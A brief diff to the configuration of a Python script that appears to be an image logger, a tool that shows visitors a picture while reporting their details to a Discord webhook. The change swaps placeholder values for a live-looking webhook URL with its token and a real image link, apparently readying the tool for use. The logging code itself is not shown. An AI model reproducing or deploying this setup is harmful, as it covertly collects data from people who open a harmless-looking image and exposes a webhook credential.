@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1400494938440994928/x9SIe2z0dhe2CvbpL8ZwL2Xn_l0TnlYyh2kPdU7sZH1yeVwk3ZSyA0417LC1qtyFvT2v",
+    "image": "https://images.ctfassets.net/q5l7sv7fkjc7/dkcroSPG77eWsVCeQtQsQdDaXkc4cWfxBJ5KRmMO0u4/0f41d2353325080b65578d1a82f2ed56/Flight23White-compressor.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
